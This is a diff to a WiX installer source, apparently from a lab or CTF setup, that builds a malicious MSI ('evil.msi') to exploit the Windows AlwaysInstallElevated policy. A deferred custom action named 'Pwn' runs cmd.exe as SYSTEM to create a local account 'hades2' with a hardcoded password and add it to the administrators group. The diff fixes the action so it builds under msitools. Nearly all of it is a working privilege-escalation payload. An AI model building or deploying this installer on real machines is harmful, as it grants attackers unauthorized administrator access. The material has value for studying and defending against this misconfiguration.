@@ -8,6 +8,10 @@
   match. Under AlwaysInstallElevated (HKLM+HKCU both = 1), msiexec runs the
   deferred / no-impersonate custom action in the SYSTEM context -> net user as SYSTEM.
 
+  wixl note: this msitools build has no 'Directory' property on CustomAction, so the
+  exec is a type-50 action -> Source is the CMDEXE property (full path to cmd.exe),
+  ExeCommand is the argument string.
+
   BUILD (on Kali, needs msitools):
       wixl -o evil.msi adduser.wxs
 
@@ -26,9 +30,11 @@
     <Directory Id="TARGETDIR" Name="SourceDir"/>
     <Feature Id="F" Level="1"/>
 
+    <Property Id="CMDEXE" Value="C:\Windows\System32\cmd.exe"/>
+
     <CustomAction Id="Pwn" Execute="deferred" Impersonate="no" Return="ignore"
-      Directory="TARGETDIR"
-      ExeCommand='cmd.exe /c net user hades2 P3rseph0ne!26 /add &amp;&amp; net localgroup administrators hades2 /add'/>
+      Property="CMDEXE"
+      ExeCommand='/c net user hades2 P3rseph0ne!26 /add &amp;&amp; net localgroup administrators hades2 /add'/>
 
     <InstallExecuteSequence>
       <Custom Action="Pwn" After="InstallInitialize"/>
